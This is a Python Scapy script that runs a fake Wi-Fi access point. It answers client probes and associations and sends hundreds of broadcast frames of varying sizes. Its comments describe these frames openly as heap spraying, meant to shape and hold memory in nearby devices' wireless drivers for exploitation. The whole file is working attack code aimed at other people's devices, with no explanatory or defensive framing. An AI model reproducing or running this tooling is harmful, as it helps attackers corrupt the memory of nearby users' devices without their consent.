import time
import threading
import logging
import os
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11AssoReq, Dot11AssoResp, Dot11ProbeReq, Dot11ProbeResp
from scapy.layers.l2 import LLC, SNAP

# Configuration
SSID = "TestAP"
INTERFACE = "wlan0mon"
BSSID = "8E:B8:4A:75:E3:56"
CHANNEL = 1
BEACON_INTERVAL = 0.1024
CUSTOM_VSA = b'\xdd\x07\x00\x50\xf2\x02\x01\x01'

# Global sequence number
seq_num = 0
seq_num_lock = threading.Lock()

# Logging configuration
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Track associated clients and their states
clients = {}

ACK_TIMEOUT = 1  # Timeout in seconds for waiting ACKs

# Advanced strategy: Create and align multiple allocations to influence heap layout
ADVANCED_ALLOCATION_COUNT = 300  # Number of allocations for heap spraying
ADVANCED_PAYLOAD_SIZES = [500, 1000, 1500, 2000, 2500, 3000]  # More varied sizes for better control
ADVANCED_PAYLOAD_CONTENTS = [b'\x00', b'\xff', b'\xaa', b'\x55', b'\x11', b'\xee']  # Additional content for heap control


def set_interface_settings(interface, channel):
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ifconfig {interface} up")
    os.system(f"sudo iwconfig {interface} channel {channel}")
    os.system(f"sudo ifconfig {interface} promisc")

def get_sequence_number():
    global seq_num
    with seq_num_lock:
        seq_num = (seq_num + 1) % 4096
        logging.debug(f"Generated sequence number: {seq_num}")
        return seq_num

def create_element(id, info):
    logging.debug(f"Creating element with ID {id} and info {info}")
    return Dot11Elt(ID=id, info=info)

def create_beacon(ssid, bssid, channel):
    seq = get_sequence_number()
    logging.info(f"Creating beacon frame with sequence number: {seq}")
    beacon = RadioTap() / \
             Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid, SC=seq << 4) / \
             Dot11Beacon(cap=0x2104) / \
             create_element(0, ssid) / \
             create_element(1, b'\x82\x84\x8b\x96\x0c\x12\x18\x24') / \
             create_element(3, bytes([channel])) / \
             create_element(5, b'\x00\x01\x00\x00') / \
             create_element(7, b'\x07\x42\x55\x53\x00\x00') / \
             create_element(50, b'\x30\x48\x60\x6c') / \
             create_element(42, b'\x00') / \
             create_element(61, bytes([channel]) + b'\x01\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') / \
             create_element(221, CUSTOM_VSA)
    logging.debug(f"Beacon frame created: {beacon.summary()}")
    return beacon

def create_useless_packet(payload_size, payload_content=b'\x00'):
    seq = get_sequence_number()
    logging.info(f"Creating useless packet with sequence number: {seq} and payload size: {payload_size}")
    payload = payload_content * payload_size  # Consistent payload to ensure predictable heap behavior
    useless_packet = RadioTap() / \
                    Dot11(type=2, subtype=0, addr1="ff:ff:ff:ff:ff:ff", addr2=BSSID, addr3=BSSID, SC=seq << 4) / \
                    LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP(OUI=b'\x00\x00\x00', code=0x0800) / \
                    Raw(load=payload)
    logging.debug(f"Useless packet created: {useless_packet.summary()}")
    return useless_packet

def send_useless_packets(interface, count=ADVANCED_ALLOCATION_COUNT, delay=0.05, maintain_interval=1.0):
    logging.info(f"Sending {count} useless packets of varying sizes to align heap memory")
    maintained_packets = []
    for i in range(count):
        try:
            payload_size = ADVANCED_PAYLOAD_SIZES[i % len(ADVANCED_PAYLOAD_SIZES)]  # Cycle through different sizes
            payload_content = ADVANCED_PAYLOAD_CONTENTS[i % len(ADVANCED_PAYLOAD_CONTENTS)]  # Cycle through different contents
            packet = create_useless_packet(payload_size, payload_content)
            sendp(packet, iface=interface, verbose=False)
            maintained_packets.append(packet)
            time.sleep(delay)  # Controlled delay to allow heap to stabilize
        except Exception as e:
            logging.error(f"Error sending useless packet: {e}")

    # Maintain allocations to prevent the driver from freeing them
    while True:
        try:
            for packet in maintained_packets:
                sendp(packet, iface=interface, verbose=False)
                logging.debug(f"Maintaining allocation with packet: {packet.summary()}")
            time.sleep(maintain_interval)
        except Exception as e:
            logging.error(f"Error maintaining allocations: {e}")

def create_probe_response(bssid, src_mac):
    seq = get_sequence_number()
    logging.info(f"Creating probe response for source MAC: {src_mac}")
    probe_response = RadioTap() / \
                     Dot11(type=0, subtype=5, addr1=src_mac, addr2=bssid, addr3=bssid, SC=seq << 4) / \
                     Dot11ProbeResp(cap=0x2104) / \
                     create_element(0, SSID) / \
                     create_element(1, b'\x82\x84\x8b\x96\x0c\x12\x18\x24') / \
                     create_element(3, bytes([CHANNEL])) / \
                     create_element(7, b'\x07\x42\x55\x53\x00\x00') / \
                     create_element(50, b'\x30\x48\x60\x6c') / \
                     create_element(42, b'\x00') / \
                     create_element(61, bytes([CHANNEL]) + b'\x01\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') / \
                     create_element(221, CUSTOM_VSA)
    logging.debug(f"Probe response frame created: {probe_response.summary()}")
    return probe_response

def create_assoc_response(bssid, src_mac):
    seq = get_sequence_number()
    logging.info(f"Creating association response for source MAC: {src_mac}")
    assoc_response = RadioTap() / \
                     Dot11(type=0, subtype=1, addr1=src_mac, addr2=bssid, addr3=bssid, SC=seq << 4) / \
                     Dot11AssoResp(cap=0x2104, AID=1, status=0) / \
                     create_element(1, b'\x82\x84\x8b\x96\x0c\x12\x18\x24') / \
                     create_element(50, b'\x30\x48\x60\x6c') / \
                     create_element(3, bytes([CHANNEL])) / \
                     create_element(7, b'\x07\x42\x55\x53\x00\x00') / \
                     create_element(42, b'\x00') / \
                     create_element(61, bytes([CHANNEL]) + b'\x01\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') / \
                     create_element(221, CUSTOM_VSA)
    logging.debug(f"Association response frame created: {assoc_response.summary()}")
    return assoc_response

def send_beacon(interface):
    while True:
        try:
            beacon = create_beacon(SSID, BSSID, CHANNEL)
            sendp(beacon, iface=interface, verbose=False)
            logging.info(f"Beacon sent on interface {interface}")
            time.sleep(BEACON_INTERVAL)
        except Exception as e:
            logging.error(f"Error sending beacon: {e}")

def packet_handler(packet):
    try:
        # Check RadioTap header to filter out packets sent by our own AP
        radiotap_header = packet.getlayer(RadioTap)
        if radiotap_header and radiotap_header.addr2 == BSSID:
            return  # Ignore packets sent by our own AP

        if packet.haslayer(Dot11ProbeReq):
            logging.info(f"Received Probe request from {packet.addr2}")
            probe_response = create_probe_response(BSSID, packet.addr2)
            sendp(probe_response, iface=INTERFACE, verbose=False)
            logging.info(f"Probe response sent to {packet.addr2}")

        elif packet.haslayer(Dot11AssoReq) and packet.addr1 == BSSID:
            logging.info(f"Received Association request from {packet.addr2}")
            assoc_response = create_assoc_response(BSSID, packet.addr2)
            sendp(assoc_response, iface=INTERFACE, verbose=False)
            logging.info(f"Association response sent to {packet.addr2}")
            clients[packet.addr2] = {'associated': True}
            logging.info(f"Client {packet.addr2} associated")

    except Exception as e:
        logging.error(f"Error handling packet: {e}")

def main():
    logging.info("Starting script...")
    try:
        set_interface_settings(INTERFACE, CHANNEL)

        # Align heap with large useless packets and maintain allocations
        spray_thread = threading.Thread(target=send_useless_packets, args=(INTERFACE,))
        spray_thread.daemon = True
        spray_thread.start()

        # Start sending beacons
        beacon_thread = threading.Thread(target=send_beacon, args=(INTERFACE,))
        beacon_thread.daemon = True
        beacon_thread.start()

        # Start sniffing packets
        sniff(iface=INTERFACE, prn=packet_handler, store=0)
    except Exception as e:
        logging.error(f"Error in main: {e}")

if __name__ == "__main__":
    main()
